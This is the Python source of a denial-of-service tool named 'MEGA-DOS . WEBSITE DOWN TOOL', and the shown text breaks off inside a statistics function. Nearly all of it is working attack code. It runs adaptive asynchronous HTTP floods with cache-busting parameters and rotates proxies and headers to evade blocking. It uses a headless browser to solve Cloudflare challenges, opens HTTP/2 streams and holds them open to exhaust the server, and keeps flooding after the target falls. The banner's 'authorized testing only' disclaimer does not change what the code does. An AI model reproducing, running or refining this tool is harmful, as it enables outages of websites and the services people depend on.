import asyncio
import aiohttp
import random
import time
import socket
import sys
import os
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor # Still useful for sync tasks in async context
import http.client
import ssl

# Libraries for advanced features
try:
    from hyper.contrib import HTTP20Connection # For HTTP/2 attacks
except ImportError:
    print("Warning: 'hyper' library not found. HTTP/2 attack functionality will be disabled. Install with: pip install hyper")
    HTTP20Connection = None

try:
    from pyppeteer import launch # For JS challenge solving
    from pyppeteer.errors import TimeoutError as PyppeteerTimeoutError
except ImportError:
    print("Warning: 'pyppeteer' library not found. JS challenge solving will be disabled. Install with: pip install pyppeteer")
    print("         Also requires Chromium browser. Pyppeteer will download it automatically on first run.")
    launch = None
    PyppeteerTimeoutError = None


# ANSI escape codes for colors
class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    ORANGE = "\033[38;5;208m"
    LIGHT_BLUE = "\033[94m"
    LIGHT_GREEN = "\033[92m"
    LIGHT_CYAN = "\033[96m"
    LIGHT_MAGENTA = "\033[95m"
    LIGHT_YELLOW = "\033[93m"

# Banner
def print_banner():
    frames = [
        f"""{Colors.RED}

░▒▓██████████████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░       ░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░
{Colors.RESET}
    {Colors.BLUE}
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                            MEGA-DOS . WEBSITE DOWN TOOL                           ║
║                                                                                   ║
║                              Author-Shahriar Mahmud                               ║
║                                                                                   ║
║              Facebook id:https://www.facebook.com/shahriar.mahmud.5686            ║
║                                                                                   ║
║                                   🚨 WARNING 🚨                                  ║
║                                                                                   ║
║      ***This tool is for educational and authorized testing purposes only.***     ║
║                  ***Unauthorized use against websites, servers,***                ║
║            ***or networks you do not own or have permission to test is***         ║
║                    ***illegal and can lead to criminal charges.***                ║
║                               ***Use responsibly***                               ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
        """,
        f"""{Colors.CYAN}

░▒▓██████████████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░       ░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░
{Colors.RESET}
    {Colors.BLUE}
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                            MEGA-DOS . WEBSITE DOWN TOOL                           ║
║                                                                                   ║
║                              Author-Shahriar Mahmud                               ║
║                                                                                   ║
║              Facebook id:https://www.facebook.com/shahriar.mahmud.5686            ║
║                                                                                   ║
║                                   🚨 WARNING 🚨                                  ║
║                                                                                   ║
║      ***This tool is for educational and authorized testing purposes only.***     ║
║                  ***Unauthorized use against websites, servers,***                ║
║            ***or networks you do not own or have permission to test is***         ║
║                    ***illegal and can lead to criminal charges.***                ║
║                               ***Use responsibly***                               ║
╚═══════════════════════════════════════════════════════════════════════════════════╝

        """,
        f"""{Colors.MAGENTA}

░▒▓██████████████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░       ░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░
{Colors.RESET}
    {Colors.BLUE}
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                            MEGA-DOS . WEBSITE DOWN TOOL                           ║
║                                                                                   ║
║                              Author-Shahriar Mahmud                               ║
║                                                                                   ║
║              Facebook id:https://www.facebook.com/shahriar.mahmud.5686            ║
║                                                                                   ║
║                                   🚨 WARNING 🚨                                  ║
║                                                                                   ║
║      ***This tool is for educational and authorized testing purposes only.***     ║
║                  ***Unauthorized use against websites, servers,***                ║
║            ***or networks you do not own or have permission to test is***         ║
║                    ***illegal and can lead to criminal charges.***                ║
║                               ***Use responsibly***                               ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
        """
    ]

    for i in range(5):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(frames[i % len(frames)])
        time.sleep(0.3)

    os.system('cls' if os.name == 'nt' else 'clear')
    print(frames[0])

# Constants and configurations
MAX_CONCURRENT_REQUESTS = 2000 # Max concurrent asyncio tasks/connections
INITIAL_CONCURRENCY = 50       # For testing phase
SUCCESS_MESSAGE = f"""{Colors.GREEN}
    ╔═════════════════════════════════════════════════╗
    ║                                                 ║
    ║              TARGET WEBSITE IS DOWN             ║
    ║                                                 ║
    ║              ATTACK WAS SUCCESSFUL              ║
    ║                                                 ║
    ╚═════════════════════════════════════════════════╝
    {Colors.RESET}"""

# Global variables (using asyncio.Lock for shared access where needed)
_request_count = 0
_success_count = 0
_failed_count = 0
_running = True
_attack_active = False
_target_down = False
_target_down_time = None
_last_check_time = 0
_check_interval = 5  # seconds between availability checks
_availability_history = []
_attack_paused = False

# Lock for updating shared counters
counter_lock = asyncio.Lock()

async def increment_counter(counter_type):
    global _request_count, _success_count, _failed_count
    async with counter_lock:
        if counter_type == 'request':
            _request_count += 1
        elif counter_type == 'success':
            _success_count += 1
        elif counter_type == 'failed':
            _failed_count += 1

# --- Proxy Configuration ---
# Format: "http://user:pass@ip:port" or "socks5://user:pass@ip:port"
# IMPORTANT: Replace with your actual, authorized proxy list.
# Aiohttp supports HTTP/HTTPS proxies directly, for SOCKS proxies,
# you might need aiohttp-socks or a custom connector.
PROXY_LIST = [
    # "http://your_proxy_ip:port",
    # "http://user:pass@your_auth_proxy_ip:port",
    # "socks5://your_socks_proxy_ip:port", # Requires aiohttp-socks
]

def get_random_proxy_config():
    if PROXY_LIST:
        proxy_url = random.choice(PROXY_LIST)
        return proxy_url
    return None

# --- Advanced User-Agents & Headers ---
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 OPR/85.0.4341.60",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Vivaldi/5.1.2567.46",
    "Mozilla/5.0 (Android 11; Mobile; rv:98.0) Gecko/98.0 Firefox/98.0"
]

# Enhanced Headers Pool (more diverse and realistic)
headers_pool = [
    # Common Desktop Browser
    {
        "User-Agent": "", # Filled randomly
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1"
    },
    # Common Mobile Browser
    {
        "User-Agent": "", # Filled randomly
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    },
    # XHR Request
    {
        "User-Agent": "", # Filled randomly
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    },
    # POST Request Specific
    {
        "User-Agent": "", # Filled randomly
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded", # Or application/json
        "Connection": "keep-alive"
    }
]

# Request methods
request_methods = ["GET", "HEAD", "POST"]

# Payloads for POST requests (diverse to simulate different interactions)
post_payloads = [
    {"data": "search_query=test_query&action=search"},
    {"data": "username=user%40example.com&password=securepass123&login=submit"},
    {"data": "comment_text=This+is+a+test+comment.&post_id=123&submit=true"},
    {"json": {"product_id": random.randint(1000, 9999), "quantity": random.randint(1, 5), "action": "add_to_cart"}},
    {"json": {"feedback_type": "bug", "message": "The button is not working on page X.", "user_id": random.randint(1, 100)}},
    {"data": f"email=test_{random.randint(1, 9999)}%40example.com&subscribe=yes"},
    {"data": f"name={random.choice(['John', 'Jane', 'Mike'])}&message={random.choice(['Hello', 'Greetings', 'Nice page'])}"},
]

class AsyncAttackCoordinator:
    def __init__(self, url):
        self.url = url
        self.parsed_url = urlparse(url)
        self.hostname = self.parsed_url.netloc
        self.port = 443 if self.parsed_url.scheme == 'https' else 80
        self.use_ssl = self.parsed_url.scheme == 'https'
        self.path = self.parsed_url.path if self.parsed_url.path else "/"
        if self.parsed_url.query:
            self.path += f"?{self.parsed_url.query}"

        # Attack parameters
        self.current_concurrency = INITIAL_CONCURRENCY
        self.request_delay = 0.001  # Minimal delay for async, adjusted adaptively
        self.attack_intensity = 1

        self.session = None # aiohttp client session
        self.attack_tasks = [] # To keep track of running attack coroutines

        # Evasion parameters
        self.cookies = {}
        self.current_user_agent = random.choice(user_agents)
        self.js_challenge_detected = False
        self.js_challenge_solving_task = None

    async def init_session(self, headers=None, cookies=None):
        """Initializes or re-initializes aiohttp client session with new headers/cookies."""
        if self.session and not self.session.closed:
            await self.session.close()

        # Custom connector for proxy support.
        # For SOCKS proxies, you would need aiohttp-socks and specific connector configuration.
        connector = aiohttp.TCPConnector(ssl=False if not self.use_ssl else None)
        
        # Set default headers and cookies for the session
        default_headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive" # Aiohttp handles this
        }
        if headers:
            default_headers.update(headers)
        default_headers["User-Agent"] = self.current_user_agent # Ensure session uses current UA

        self.session = aiohttp.ClientSession(
            connector=connector,
            headers=default_headers,
            cookies=cookies if cookies else self.cookies
        )

    async def close_session(self):
        """Closes the aiohttp client session."""
        if self.session and not self.session.closed:
            await self.session.close()
            self.session = None

    async def verify_target_async(self):
        """Asynchronously check if target is reachable and get initial response time."""
        print(f"Testing connection to {self.hostname}...")
        try:
            start_time = time.time()
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
                async with session.head(self.url, allow_redirects=False) as response:
                    response_time = time.time() - start_time
                    print(f"Target is reachable. Status: {response.status}")
                    print(f"Initial response time: {response_time:.3f} seconds")
                    return True, response_time
        except Exception as e:
            print(f"Error: Cannot reach target. {str(e)}")
            return False, 0

    async def is_website_available_async(self):
        """Asynchronously check if website is still available."""
        global _last_check_time, _availability_history

        current_time = time.time()
        if current_time - _last_check_time < _check_interval:
            # If checked recently, rely on last known status.
            return _availability_history[-1] if _availability_history else True

        _last_check_time = current_time

        try:
            # Use a fresh session for availability check to avoid attack headers impacting it
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                headers = {
                    "User-Agent": f"AvailabilityChecker/1.0 ({random.randint(1000, 9999)})",
                    "Accept": "text/html",
                    "Connection": "close" # Ensure clean connection
                }
                async with session.get(self.url, headers=headers, allow_redirects=False) as response:
                    # Check for JS challenge (e.g., Cloudflare 403/503 with specific headers)
                    if response.status in [403, 503] and 'cloudflare' in str(response.headers).lower() and launch:
                        print(f"{Colors.YELLOW}JS Challenge detected! Attempting to solve...{Colors.RESET}")
                        if not self.js_challenge_solving_task or self.js_challenge_solving_task.done():
                             self.js_challenge_solving_task = asyncio.create_task(self.solve_js_challenge_and_update_session(self.url))
                        self.js_challenge_detected = True # Flag to avoid repeated attempts
                        return False # Assume temporarily down due to challenge

                    if response.status < 500:
                        _availability_history.append(True)
                        return True
                    else:
                        _availability_history.append(False)
        except (aiohttp.ClientError, asyncio.TimeoutError, socket.gaierror, ssl.SSLError):
            _availability_history.append(False)
        except Exception as e:
            print(f"Error during availability check: {e}")
            _availability_history.append(False)

        # Keep history limited to last 5 checks
        if len(_availability_history) > 5:
            _availability_history = _availability_history[-5:]

        # Consider website down only if it failed multiple times recently
        return any(_availability_history[-3:]) if len(_availability_history) >= 3 else True


    async def solve_js_challenge_and_update_session(self, url):
        """Uses pyppeteer to solve JS challenges and updates session cookies/User-Agent."""
        global _attack_paused
        if not launch:
            print(f"{Colors.RED}Pyppeteer not installed, cannot solve JS challenge.{Colors.RESET}")
            self.js_challenge_detected = False # Reset flag if cannot solve
            return

        print(f"{Colors.YELLOW}Pausing attack to solve JS challenge...{Colors.RESET}")
        _attack_paused = True # Pause current attack until challenge is solved
        
        browser = None
        try:
            # Use a temporary directory for user data to avoid conflicts with previous runs
            browser = await launch(headless=True, args=['--no-sandbox', '--disable-dev-shm-usage'])
            page = await browser.newPage()
            await page.setUserAgent(random.choice(user_agents)) # Start with a random UA

            print(f"{Colors.BLUE}Navigating headless browser to {url}...{Colors.RESET}")
            await page.goto(url, {'waitUntil': 'networkidle0', 'timeout': 30000}) # Wait up to 30 seconds for challenge

            # Wait a bit longer to ensure all JS is executed and redirects complete
            await asyncio.sleep(5)

            cookies_list = await page.cookies()
            new_user_agent = await page.evaluate('navigator.userAgent')

            # Convert pyppeteer cookies format to aiohttp format
            aiohttp_cookies = {c['name']: c['value'] for c in cookies_list}

            print(f"{Colors.GREEN}JS Challenge likely solved! Updating attack session.{Colors.RESET}")
            print(f"Extracted User-Agent: {new_user_agent}")

            async with counter_lock: # Protect shared state updates
                self.cookies = aiohttp_cookies
                self.current_user_agent = new_user_agent
                self.js_challenge_detected = False # Reset flag
            
            await self.init_session() # Re-initialize the main aiohttp session with new cookies/UA
            
            print(f"{Colors.GREEN}Resuming attack...{Colors.RESET}")
            _attack_paused = False # Resume attack
            
        except PyppeteerTimeoutError:
            print(f"{Colors.RED}Pyppeteer Timeout: JS challenge took too long or failed.{Colors.RESET}")
            async with counter_lock:
                self.js_challenge_detected = False
            _attack_paused = False
        except Exception as e:
            print(f"{Colors.RED}Error solving JS challenge with Pyppeteer: {e}{Colors.RESET}")
            async with counter_lock:
                self.js_challenge_detected = False
            _attack_paused = False
        finally:
            if browser:
                await browser.close()

    async def adaptive_attack_async(self):
        """Adjust attack parameters based on website response."""
        global _request_count, _success_count, _failed_count, _attack_paused, _target_down

        if _attack_paused:
            return

        async with counter_lock:
            if _request_count > 0:
                success_rate = _success_count / _request_count
            else:
                success_rate = 1.0

        website_up = await self.is_website_available_async()

        if _target_down: # If website is already marked down
            return

        if not website_up:
            self.handle_website_down()
            return

        # Website is still up, adjust attack parameters
        if success_rate > 0.9:  # Good success rate, intensify attack
            self.attack_intensity += 1
            self.current_concurrency = min(self.current_concurrency + 200, MAX_CONCURRENT_REQUESTS)
            self.request_delay = max(self.request_delay * 0.7, 0.00001)  # Decrease delay

            print(f"\n{Colors.CYAN}[INTENSIFYING ATTACK]{Colors.RESET} Level {self.attack_intensity}")
            print(f"Increasing to {self.current_concurrency} concurrent requests")
            print(f"Adjusting request delay to {self.request_delay:.5f} seconds")

            await self.spawn_additional_tasks()

        elif success_rate < 0.5 and not self.js_challenge_detected:  # Poor success rate, adjust strategy if not JS challenge
            # First try to slow down a bit to avoid overwhelming our connection
            self.request_delay = min(self.request_delay * 1.5, 0.01)
            print(f"\n{Colors.YELLOW}[ADJUSTING ATTACK]{Colors.RESET} Success rate low ({success_rate:.2f})")
            print(f"Adjusting request delay to {self.request_delay:.5f} seconds")

    def handle_website_down(self):
        """Handle the case when website is detected as down."""
        global _target_down, _target_down_time, _running, _attack_paused, _request_count, _success_count

        if not _target_down:
            _target_down = True
            _target_down_time = time.time()

            os.system('cls' if os.name == 'nt' else 'clear')
            print(SUCCESS_MESSAGE)
            print(f"{Colors.GREEN}Website has been taken down after sending {_request_count} requests{Colors.RESET}")
            # start_time global is not reliable in async, should pass it or use a better measure
            print(f"{Colors.GREEN}Attack duration: {time.time() - start_time:.2f} seconds{Colors.RESET}")
            print(f"{Colors.GREEN}Final success rate: {(_success_count / _request_count) * 100:.1f}%{Colors.RESET}")
            print(f"\n{Colors.GREEN}Target is unresponsive. Attack successful.{Colors.RESET}")

            print("\nContinuing attack to keep the website down...")
            _attack_paused = False # Ensure attack is not paused

    async def spawn_additional_tasks(self):
        """Spawns additional attack coroutines (tasks)."""
        global _attack_paused

        if _attack_paused:
            return

        current_count = len([task for task in self.attack_tasks if not task.done()])
        new_tasks = self.current_concurrency - current_count

        if new_tasks <= 0:
            return

        print(f"Spawning {new_tasks} additional attack tasks...")

        for i in range(new_tasks):
            task = asyncio.create_task(self.worker_async())
            self.attack_tasks.append(task)
            if (i + 1) % 50 == 0:
                print(f"  Started {i + 1} new tasks...")

    async def send_http_request_async(self):
        """Send HTTP request using aiohttp client session."""
        global _attack_paused

        if _attack_paused:
            await asyncio.sleep(0.5)
            return

        if not self.session:
            await self.init_session() # Initialize session if not already

        try:
            method = random.choice(request_methods)
            
            # Choose a random header set and customize it
            headers = random.choice(headers_pool).copy()
            headers["User-Agent"] = self.current_user_agent # Use the current effective User-Agent
            if "Referer" in headers:
                headers["Referer"] = self.url # Simple referer
            
            # Add random query parameter to bypass caching
            path_with_nocache = f"{self.path}?nocache={random.randint(1, 999999)}"
            
            # Introduce referer randomization to simulate browsing behavior
            if random.random() < 0.3: # 30% chance to use a 'realistic' referer
                # A simple way to simulate internal navigation
                headers["Referer"] = f"{self.url}/{random.choice(['about', 'contact', 'blog', 'products'])}?id={random.randint(1,100)}"


            proxy = get_random_proxy_config() # Get a random proxy

            request_kwargs = {
                'url': self.url + path_with_nocache,
                'headers': headers,
                'timeout': aiohttp.ClientTimeout(total=5),
                'allow_redirects': False # Prevent following redirects which can be resource intensive
            }
            if proxy:
                request_kwargs['proxy'] = proxy

            if method in ["GET", "HEAD"]:
                async with self.session.request(method, **request_kwargs) as response:
                    await response.read()
            else: # POST
                payload = random.choice(post_payloads)
                if "json" in payload:
                    request_kwargs['json'] = payload["json"]
                elif "data" in payload:
                    request_kwargs['data'] = payload["data"]

                # Ensure Content-Type header is set for POST requests
                if "Content-Type" not in headers:
                    if "json" in payload:
                        headers["Content-Type"] = "application/json"
                    elif "data" in payload:
                        headers["Content-Type"] = "application/x-www-form-urlencoded"

                async with self.session.post(**request_kwargs) as response:
                    await response.read()

            await increment_counter('request')
            if response.status < 400: # Success codes
                await increment_counter('success')
            else:
                await increment_counter('failed')
        except (aiohttp.ClientError, asyncio.TimeoutError, socket.gaierror, ssl.SSLError):
            await increment_counter('request')
            await increment_counter('failed')
        except Exception as e:
            # print(f"Unexpected error in send_http_request_async: {e}") # Debugging
            await increment_counter('request')
            await increment_counter('failed')


    async def http2_attack_stream(self, num_streams=50):
        """Performs an HTTP/2 stream multiplexing attack using hyper."""
        if not HTTP20Connection:
            return # HTTP/2 not enabled due to missing library

        print(f"{Colors.ORANGE}Initiating HTTP/2 stream attack with {num_streams} streams...{Colors.RESET}")
        conn = None
        try:
            conn = HTTP20Connection(self.hostname, secure=self.use_ssl)
            conn.connect()
            
            for _ in range(num_streams):
                headers = [
                    (':method', random.choice(['GET', 'POST'])),
                    (':authority', self.hostname),
                    (':scheme', 'https' if self.use_ssl else 'http'),
                    (':path', f'{self.path}?nocache={random.randint(1, 999999)}'),
                    ('user-agent', self.current_user_agent),
                    ('accept', 'text/html,application/xhtml+xml'),
                ]
                # If POST, send a small, incomplete body to keep stream open longer
                if headers[0][1] == 'POST':
                    body = b'a' * 1024 # Small body
                    headers.append(('content-length', str(len(body))))
                    stream_id = conn.request(headers=headers, body=body, end_stream=False) # Keep stream open
                else:
                    stream_id = conn.request(headers=headers) # For GET/HEAD, just send headers

                await increment_counter('request') # Count this as a request attempt
                # In a real attack, you'd manage these streams, possibly send more data,
                # or just keep them open for a long time without closing.
                # For this demo, we just open them.
                
            # Keep the connection open for a duration, not closing streams immediately
            # This is key for HTTP/2 resource exhaustion.
            print(f"{Colors.ORANGE}HTTP/2 streams opened. Holding connection for 10 seconds...{Colors.RESET}")
            await asyncio.sleep(10) # Hold connection to maintain open streams

        except Exception as e:
            print(f"{Colors.RED}HTTP/2 attack stream failed: {e}{Colors.RESET}")
            await increment_counter('failed')
        finally:
            if conn:
                conn.close()

    async def worker_async(self):
        """Asynchronous worker function for sending requests."""
        global _running, _attack_paused
        while _running:
            if _attack_paused:
                await asyncio.sleep(0.5)
                continue
            
            # Mix in HTTP/2 attacks if enabled and conditions met
            if HTTP20Connection and random.random() < 0.05: # 5% chance for HTTP/2 attack
                await self.http2_attack_stream(num_streams=random.randint(10, 100)) # Random number of streams
            else:
                await self.send_http_request_async()

            await asyncio.sleep(self.request_delay)

    async def run_testing_phase_async(self):
        """Run initial asynchronous testing phase."""
        global _request_count, start_time

        print("\nStarting initial testing phase (15 seconds)...")

        # Start a small number of asynchronous tasks for testing
        test_tasks = [
            asyncio.create_task(self.worker_async())
            for _ in range(INITIAL_CONCURRENCY)
        ]

        test_start_time = time.time()
        last_count = 0

        while time.time() - test_start_time < 15 and _running:
            await asyncio.sleep(1)
            async with counter_lock:
                current_count = _request_count
            current_rps = current_count - last_count
            last_count = current_count

            elapsed = time.time() - test_start_time
            print(f"Testing: {elapsed:.1f}/15s | Current: {current_rps} req/s | Total: {current_count}")

        # Cancel test tasks
        for task in test_tasks:
            task.cancel()
        await asyncio.gather(*test_tasks, return_exceptions=True) # Await their cancellation

        test_duration = time.time() - test_start_time
        async with counter_lock:
            if _request_count > 0:
                rps = _request_count / test_duration
                success_rate = (_success_count / _request_count) * 100
            else:
                rps = 0
                success_rate = 0

        print("\n===== TESTING PHASE COMPLETE =====")
        print(f"Website handled {rps:.2f} requests per second")
        print(f"Success rate: {success_rate:.1f}%")

        # Calculate optimal parameters based on test results
        if rps < 10:
            self.current_concurrency = 1500
            self.request_delay = 0.00001
        elif rps < 50:
            self.current_concurrency = 1000
            self.request_delay = 0.0001
        else:
            self.current_concurrency = 750
            self.request_delay = 0.0005

        print("\n===== ATTACK CONFIGURATION =====")
        print(f"Concurrent requests: {self.current_concurrency}")
        print(f"Request delay: {self.request_delay:.5f} seconds")

        return True if rps > 0 else False

    async def launch_full_attack_async(self):
        """Launch the full attack with optimized parameters."""
        global _running, _attack_active, _request_count, _success_count, _failed_count

        print("\n===== LAUNCHING FULL ATTACK =====")
        print(f"Target: {self.url}")
        print(f"Launching with {self.current_concurrency} concurrent tasks")
        print("Attack starting in 3 seconds...")
        await asyncio.sleep(3)

        # Reset counters
        async with counter_lock:
            _request_count = 0
            _success_count = 0
            _failed_count = 0

        _attack_active = True

        # Initialize the main aiohttp session for attack
        await self.init_session()

        # Launch attack tasks
        self.attack_tasks = [
            asyncio.create_task(self.worker_async())
            for _ in range(self.current_concurrency)
        ]

        print(f"All {self.current_concurrency} attack tasks launched.")

        # Start adaptive attack monitoring
        while _running and not _target_down:
            await asyncio.sleep(5)
            await self.adaptive_attack_async()

    async def check_for_continuation_async(self):
        """Periodically check if the website is still down and inform user."""
        global _running, _attack_paused, _target_down

        check_interval = 30 # Check every 30 seconds after website is down

        while _running:
            if _target_down and not _attack_paused:
                if not await self.is_website_available_async():
                    sys.stdout.write(f"\r{Colors.GREEN}[WEBSITE DOWN]{Colors.RESET} Confirmed: Target remains down. Continuing attack.  ")
                    sys.stdout.flush()
                else:
                    print(f"\n{Colors.YELLOW}Website appears to be back up. Resuming attack to take it down again...{Colors.RESET}")
                    async with counter_lock:
                        _target_down = False
                        _attack_paused = False
            await asyncio.sleep(check_interval)

    async def stats_monitor_async(self):
        """Monitor and display attack statistics."""
        global _running, _attack_active, _request_count, _attack_paused, _success_count

        last_count = 0
